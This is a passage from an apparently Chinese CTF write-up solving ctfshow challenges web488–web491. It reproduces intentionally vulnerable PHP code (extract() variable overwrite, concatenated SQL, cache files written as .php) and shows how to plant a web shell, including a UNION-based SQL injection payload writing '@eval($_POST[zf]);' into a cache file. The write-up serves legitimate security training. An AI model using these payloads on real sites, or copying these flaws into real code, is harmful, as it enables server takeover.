class="code"><pre><span class="line">&#123;&#123;username&#125;&#125;</span><br></pre></td></tr></table></figure><p>我们来尝试一下,写入以下内容</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411103521026.png" alt="image-20220411103521026"></p><p>返回index文件进行调试,注意处理一下index文件</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411103553676.png" alt="image-20220411103553676"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411103632717.png" alt="image-20220411103632717"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411103705971.png" alt="image-20220411103705971"></p><p>关键步骤</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411103726475.png" alt="image-20220411103726475"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411103744290.png" alt="image-20220411103744290"></p><p>可见木马写入了这个md5(error)文件里面</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411103838783.png" alt="image-20220411103838783"></p><p>接下来我们从题目里面实现一下,照index文件填入</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411104009891.png" alt="image-20220411104009891"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411104056974.png" alt="image-20220411104056974"></p><p>接着访问&#x2F;cache&#x2F;cb5e100e5a9a3e7f6d1fd97512215282.php文件</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411104157508.png" alt="image-20220411104157508"></p><p>我们去看一下它error.php的源码,发现和我们想的一样</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411104302975.png" alt="image-20220411104302975"></p><p>但是不知道你有没有发现一个问题,就是如果我们第一次就直接尝试登录,一个错误的username,就会生成error的md5文件,之后就不能在向里面写文件了</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411104517364.png" alt="image-20220411104517364"></p><p>我们这样无论怎么发送都不能在写文件了,所以只有一次机会</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411104626210.png" alt="image-20220411104626210"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411104643730.png" alt="image-20220411104643730"></p><h1 id="web489"><a href="#web489" class="headerlink" title="web489"></a>web489</h1><p>index.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 15:43:51</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-09 14:20:04</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;render/render_class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;render/db_class.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$action</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$action</span>))&#123;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;location:index.php?action=login&#x27;</span>);</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$action</span>==<span class="string">&#x27;check&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id from user where username = &#x27;&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$username</span>).<span class="string">&quot;&#x27; and password=&#x27;&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>).<span class="string">&quot;&#x27; order by id limit 1&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="variable">$user</span>=db::<span class="title function_ invoke__">select_one</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line">template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="string">&#x27;index&#x27;</span>,<span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span>=&gt;<span class="variable">$username</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$action</span>==<span class="string">&#x27;clear&#x27;</span>)&#123;</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;rm -rf cache/*&#x27;</span>);</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;cache clear&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$action</span>==<span class="string">&#x27;login&#x27;</span>)&#123;</span><br><span class="line">template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="variable">$action</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="variable">$action</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>render&#x2F;render_class.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 17:52:18</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-09 12:11:43</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;file_class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;cache_class.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">templateUtil</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params"><span class="variable">$template</span>,<span class="variable">$arg</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(cache::<span class="title function_ invoke__">cache_exists</span>(<span class="variable">$template</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> cache::<span class="title function_ invoke__">get_cache</span>(<span class="variable">$template</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$templateContent</span>=file<span class="title class_">Util</span>::<span class="title function_ invoke__">read</span>(<span class="string">&#x27;templates/&#x27;</span>.<span class="variable">$template</span>.<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line"><span class="variable">$cache</span>=template<span class="title class_">Util</span>::<span class="title function_ invoke__">shade</span>(<span class="variable">$templateContent</span>,<span class="variable">$arg</span>);</span><br><span class="line">cache::<span class="title function_ invoke__">create_cache</span>(<span class="variable">$template</span>,<span class="variable">$cache</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cache</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span>  <span class="function"><span class="keyword">function</span> <span class="title">shade</span>(<span class="params"><span class="variable">$templateContent</span>,<span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$arg</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line"><span class="variable">$templateContent</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;&#123;&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>, <span class="variable">$value</span>, <span class="variable">$templateContent</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$templateContent</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>render&#x2F;db_class.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 20:43:40</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-09 12:11:32</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">db</span></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span>  <span class="function"><span class="keyword">function</span> <span class="title">getConnection</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"> <span class="variable">$username</span>=<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"> <span class="variable">$password</span>=<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"> <span class="variable">$port</span>=<span class="string">&#x27;3306&#x27;</span>;</span><br><span class="line"> <span class="variable">$addr</span>=<span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line"> <span class="variable">$database</span>=<span class="string">&#x27;ctfshow&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">mysqli</span>(<span class="variable">$addr</span>,<span class="variable">$username</span>,<span class="variable">$password</span>,<span class="variable">$database</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">select_one</span>(<span class="params"><span class="variable">$sql</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$conn</span> = db::<span class="title function_ invoke__">getConnection</span>();</span><br><span class="line"><span class="variable">$result</span>=<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_object</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>file_class.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 17:56:41</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-09 14:08:48</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fileUtil</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$filename</span>,<span class="variable">$content</span>,<span class="variable">$append</span> =<span class="number">0</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$append</span>)&#123;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$content</span>,FILE_APPEND);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$content</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&#x2F;render&#x2F;cache_class.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 20:49:18</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-09 12:11:38</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cache</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">create_cache</span>(<span class="params"><span class="variable">$template</span>,<span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$template</span>).<span class="string">&#x27;.php&#x27;</span>))&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">file<span class="title class_">Util</span>::<span class="title function_ invoke__">write</span>(<span class="string">&#x27;cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$template</span>).<span class="string">&#x27;.php&#x27;</span>,<span class="variable">$content</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">get_cache</span>(<span class="params"><span class="variable">$template</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> file<span class="title class_">Util</span>::<span class="title function_ invoke__">read</span>(<span class="string">&#x27;cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$template</span>).<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">cache_exists</span>(<span class="params"><span class="variable">$template</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$template</span>).<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&#x2F;templates&#x2F;index</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"> Author: h1xa</span><br><span class="line"> Date:   <span class="number">2021</span>-<span class="number">03</span>-<span class="number">08</span> <span class="number">16</span>:<span class="number">54</span>:<span class="number">39</span></span><br><span class="line"> Last Modified by:   h1xa</span><br><span class="line"> Last Modified time: <span class="number">2021</span>-<span class="number">03</span>-<span class="number">08</span> <span class="number">21</span>:<span class="number">56</span>:<span class="number">49</span></span><br><span class="line"> email: h1xa@ctfer.com</span><br><span class="line"> link: https:<span class="comment">//ctfer.com</span></span><br><span class="line"> path /templates/index.php</span><br><span class="line">--&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;CTFshow 新手入门题目 &lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">欢迎你&#123;&#123;username&#125;&#125;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>这里就解决了上一题的问题了.可以删除文件了,这里还考察了一个点,就是变量覆盖</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411125917354.png" alt="image-20220411125917354"></p><p>等到extract()函数解析完成就可以</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411125924937.png" alt="image-20220411125924937"></p><p>因此这里就可以直接和上一关一样,先重置sql语句使执行第一个render()接着传入username为一句话</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411130153307.png" alt="image-20220411130153307"></p><p>接着这次访问md5(index)文件</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411130313269.png" alt="image-20220411130313269"></p><p>可以看到这里的error.php是无法利用的了</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411130349070.png" alt="image-20220411130349070"></p><h1 id="web490"><a href="#web490" class="headerlink" title="web490"></a>web490</h1><p>index.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 15:43:51</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-09 16:45:24</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;render/render_class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;render/db_class.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$action</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$action</span>))&#123;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;location:index.php?action=login&#x27;</span>);</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$action</span>==<span class="string">&#x27;check&#x27;</span>)&#123;</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select username from user where username = &#x27;&quot;</span>.<span class="variable">$username</span>.<span class="string">&quot;&#x27; and password=&#x27;&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>).<span class="string">&quot;&#x27; order by id limit 1&quot;</span>;</span><br><span class="line"><span class="variable">$user</span>=db::<span class="title function_ invoke__">select_one</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line">template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="string">&#x27;index&#x27;</span>,<span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span>=&gt;<span class="variable">$user</span>-&gt;username));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$action</span>==<span class="string">&#x27;clear&#x27;</span>)&#123;</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;rm -rf cache/*&#x27;</span>);</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;cache clear&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$action</span>==<span class="string">&#x27;login&#x27;</span>)&#123;</span><br><span class="line">template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="variable">$action</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="variable">$action</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里也是含有sql注入的.这次只不过是把从sql取出的语句进行写入</p><p>记得先清一下文件</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411140331722.png" alt="image-20220411140331722"></p><p>接着登录发现是短标签,我们只要按照这个方式闭合就好</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411140305568.png" alt="image-20220411140305568"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select username from user where username = &#x27;1&#x27;union select &#x27;@eval($_POST[zf]);&#x27;&#x27; and password=&#x27;6512bd43d9caa6e02c990b0a82652dca&#x27; order by id limit 1</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411140520958.png" alt="image-20220411140520958"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411140614700.png" alt="image-20220411140614700"></p><h1 id="web491"><a href="#web491" class="headerlink" title="web491"></a>web491</h1><p>index.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 15:43:51</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-09 16:45:24</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;render/render_class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;render/db_class.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$action</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$action</span>))&#123;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;location:index.php?action=login&#x27;</span>);</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$action</span>==<span class="string">&#x27;check&#x27;</span>)&#123;</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select username from user where username = &#x27;&quot;</span>.<span class="variable">$username</span>.<span class="string">&quot;&#x27; and password=&#x27;&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>).<span class="string">&quot;&#x27; order by id limit 1&quot;</span>;</span><br><span class="line"><span class="variable">$user</span>=db::<span class="title function_ invoke__">select_one</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line">template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="string">&#x27;index&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$action</span>==<span class="string">&#x27;clear&#x27;</span>)&#123;</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;rm -rf cache/*&#x27;</span>);</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;cache clear&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$action</span>==<span class="string">&#x27;login&#x27;</span>)&#123;</span><br><span class="line">template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="variable">$action</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="variable">$action</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>数据库里没东西</p><p>render&#x2F;render_class.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 17:52:18</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-09 16:19:23</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;file_class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;cache_class.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">templateUtil</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params"><span class="variable">$template</span>,<span class="variable">$arg</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(cache::<span class="title function_ invoke__">cache_exists</span>(<span class="variable">$template</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> cache::<span class="title function_ invoke__">get_cache</span>(<span class="variable">$template</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$templateContent</span>=file<span class="title class_">Util</span>::<span class="title function_ invoke__">read</span>(<span class="string">&#x27;templates/&#x27;</span>.<span class="variable">$template</span>.<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line"><span class="variable">$cache</span>=template<span class="title class_">Util</span>::<span class="title function_ invoke__">shade</span>(<span class="variable">$templateContent</span>,<span class="variable">$arg</span>);</span><br><span class="line">cache::<span class="title function_ invoke__">create_cache</span>(<span class="variable">$template</span>,<span class="variable">$cache</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cache</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span>  <span class="function"><span class="keyword">function</span> <span class="title">shade</span>(<span class="params"><span class="variable">$templateContent</span>,<span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$arg</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line"><span class="variable">$templateContent</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;&#123;&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>, <span class="string">&#x27;&lt;?=&#x27;</span>.<span class="variable">$value</span>.<span 